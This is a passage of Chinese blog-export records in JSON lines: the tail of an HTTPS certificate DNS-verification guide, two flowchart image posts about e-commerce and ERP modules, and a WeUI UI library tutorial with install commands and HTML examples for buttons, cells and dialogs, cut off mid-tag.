sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">3.购买后接下来就是填写认证资料包括域名解析，将系统显示的CNAME解析值，解析到域名上。代解析完成后，点击自助诊断按钮，等待系统验证。比如，域名是在阿里云买的，在域名解析里添加一条TXT类型的解析，如下内容。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/6fc54abcd23e3082f39587db73958139_936x327.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/58f309fa5ae2f1bab8c3f2fbdd7c8fbe_789x386.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:0px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">4.接下来就是将服务器上的nginx或者Apache的配置文件进行修改配置，方法见<br style=\"margin:.2em;\"></span></p><p><span style=\"font-size:16px;\">‘腾讯云https认证’后面的内容写得很清楚了</span></p><p><span style=\"font-size:16px;\"><a href=\"https://blog.csdn.net/xiaoweite1/article/details/79997813\">https://blog.csdn.net/xiaoweite1/article/details/79997813</a><br></span></p>                                    </div>", "log_PostTime": 1584891055, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "电商发货业务序列图", "log_Intro": "电商发货业务序列图", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong><span style=\"font-size:18px;\">电商发货业务序列图</span></strong></p><p><img src=\"https://img-blog.csdn.net/20180512213546476\" alt=\"\"><br></p>                                    </div>", "log_PostTime": 1584891056, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "商品模块的开发逻辑流程图", "log_Intro": "商品模块的开发逻辑流程图", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong><span style=\"font-size:18px;\">ERP商品模块的开发逻辑流程图</span></strong></p><p><img src=\"https://img-blog.csdn.net/201804291807322\" alt=\"\"></p>                                    </div>", "log_PostTime": 1584891057, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "商品模块的业务流程图", "log_Intro": "商品模块的业务流程图", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong><span style=\"font-size:18px;\">ERP系统商品模块业务开发梳理</span></strong></p><p><img src=\"https://img-blog.csdn.net/20180429181953295\" alt=\"\"></p>                                    </div>", "log_PostTime": 1584891059, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "WeUI 详细介绍", "log_Intro": "WeUI 详细介绍", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">WeUI 是由微信官方设计团队专为微信移动 Web 应用设计的 UI 库。<br></p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">WeUI 是一套同微信原生视觉体验一致的基础样式库，为微信 Web 开发量身设计，可以令用户的使用感知更加统一。包含<code style=\"font-family:monospace, monospace;font-size:1em;\">button</code>、<code style=\"font-family:monospace, monospace;font-size:1em;\">cell</code>、<code style=\"font-family:monospace, monospace;font-size:1em;\">dialog</code>、<code style=\"font-family:monospace, monospace;font-size:1em;\">toast</code>、<code style=\"font-family:monospace, monospace;font-size:1em;\">article</code>、<code style=\"font-family:monospace, monospace;font-size:1em;\">icon</code>等各式元素。</p><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">使用</h3><h4 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;font-size:16px;background-color:rgb(255,255,255);\">方法一：</h4><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">使用<code style=\"font-family:monospace, monospace;font-size:1em;\">bower</code>进行安装</p><pre><code class=\"language-sql\">bower <span class=\"hljs-keyword\" style=\"color:rgb(227,206,171);\">install</span> <span class=\"hljs-comment\" style=\"color:rgb(127,159,127);\">--save weui</span></code></pre><h4 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;font-size:16px;background-color:rgb(255,255,255);\">方法二：</h4><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">使用<code style=\"font-family:monospace, monospace;font-size:1em;\">npm</code>进行安装</p><pre><code class=\"language-sql\">npm <span class=\"hljs-keyword\" style=\"color:rgb(227,206,171);\">install</span> <span class=\"hljs-comment\" style=\"color:rgb(127,159,127);\">--save weui</span></code></pre><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">开发</h3><pre class=\"hljs shell bash\" style=\"font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;padding:10px;color:rgb(220,220,220);background-color:rgb(63,63,63);line-height:1.4;\">git <span class=\"hljs-built_in\" style=\"color:rgb(204,147,147);\">clone</span> https://github.com/weui/weui.git\n<span class=\"hljs-built_in\" style=\"color:rgb(204,147,147);\">cd</span> weui\nnpm install -g gulp\nnpm install\ngulp -ws</pre><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">运行<code style=\"font-family:monospace, monospace;font-size:1em;\">gulp -ws</code>命令，会监听<code style=\"font-family:monospace, monospace;font-size:1em;\">src</code>目录下所有文件的变更，并且默认会在<code style=\"font-family:monospace, monospace;font-size:1em;\">8080</code>端口启动服务器，然后在浏览器打开 <code style=\"font-family:monospace, monospace;font-size:1em;\">http://localhost:8080/example</code>。</p><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">手机预览</h3><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">请用微信扫码 </p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184830_TLyi.png\" alt=\"\" style=\"border:none;width:280px;height:auto;\"></p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><a href=\"http://weui.github.io/weui\" rel=\"nofollow\" style=\"background-color:transparent;color:rgb(68,102,187);\">http://weui.github.io/weui/</a></p><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">Button</h3><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">按钮可以使用<code style=\"font-family:monospace, monospace;font-size:1em;\">a</code>或者<code style=\"font-family:monospace, monospace;font-size:1em;\">button</code>标签。wap上要触发按钮的active态，必须触发ontouchstart事件，可以在<code style=\"font-family:monospace, monospace;font-size:1em;\">body</code>上加上<code style=\"font-family:monospace, monospace;font-size:1em;\">ontouchstart=\"\"</code>全局触发。</p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">按钮常见的操作场景：确定、取消、警示，分别对应class：<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_btn_primary</code>、<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_btn_default</code>、<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_btn_warn</code>，每种场景都有自己的置灰态<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_btn_disabled</code>，除此外还有一种镂空按钮<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_btn_plain_xxx</code>，客户端webview里的按钮尺寸有两类，默认宽度100%，小型按钮宽度自适应，两边边框与文本间距0.75em：</p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184831_Je00.png\" alt=\"\" style=\"border:none;width:414px;height:auto;\"></p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_primary\"</span>&gt;</span>按钮<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_disabled weui_btn_primary\"</span>&gt;</span>按钮<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_warn\"</span>&gt;</span>确认<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_disabled weui_btn_warn\"</span>&gt;</span>确认<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_default\"</span>&gt;</span>按钮<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_disabled weui_btn_default\"</span>&gt;</span>按钮<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"button_sp_area\"</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_plain_default\"</span>&gt;</span>按钮<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_plain_primary\"</span>&gt;</span>按钮<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_mini weui_btn_primary\"</span>&gt;</span>按钮<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_mini weui_btn_default\"</span>&gt;</span>按钮<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span></code></pre><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">Cell</h3><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><code style=\"font-family:monospace, monospace;font-size:1em;\">Cell</code>，列表视图，用于将信息以列表的结构显示在页面上，是wap上最常用的内容结构。<code style=\"font-family:monospace, monospace;font-size:1em;\">Cell</code>由多个section组成，每个section包括section header<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_cells_title</code>以及cells<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_cells</code>。</p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><code style=\"font-family:monospace, monospace;font-size:1em;\">cell</code>由thumnail<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_cell_hd</code>、body<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_cell_bd</code>、accessory<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_cell_ft</code>三部分组成，<code style=\"font-family:monospace, monospace;font-size:1em;\">cell</code>采用自适应布局，在需要自适应的部分加上class<code style=\"font-family:monospace, monospace;font-size:1em;\">weui_cell_primary</code>即可：</p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184833_Dvdf.png\" alt=\"\" style=\"border:none;width:414px;height:auto;\"></p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">带说明的列表项</p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cells_title\"</span>&gt;</span>带说明的列表项<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cells\"</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell_bd weui_cell_primary\"</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>标题文字<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell_ft\"</span>&gt;</span>\n            说明文字\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span></code></pre><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><code style=\"font-family:monospace, monospace;font-size:1em;\">Cell</code>可根据需要进行各种自定义扩展，包括辅助说明、跳转、单选、复选等。下面以带图标、说明、跳转的列表项，其他情况可以直接参考<code style=\"font-family:monospace, monospace;font-size:1em;\">example</code>下的代码：</p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cells_title\"</span>&gt;</span>带图标、说明、跳转的列表项<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cells weui_cells_access\"</span>&gt;</span>\n\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell_hd\"</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"\"</span> <span class=\"hljs-attr\">alt</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"icon\"</span> <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"width:20px;margin-right:5px;display:block\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell_bd weui_cell_primary\"</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>cell standard<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell_ft\"</span>&gt;</span>\n            说明文字\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell_hd\"</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"\"</span> <span class=\"hljs-attr\">alt</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"icon\"</span> <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"width:20px;margin-right:5px;display:block\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell_bd weui_cell_primary\"</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>cell standard<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_cell_ft\"</span>&gt;</span>\n            说明文字\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span></code></pre><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">Dialog</h3><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">若系统的alert窗体无法满足网页的临时视图内容需求，则可以自定义实现与alert形式相似的dialog，并且在dialog中可以自定义地使用各种控件，来满足需求。</p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184835_6hQy.png\" alt=\"\" 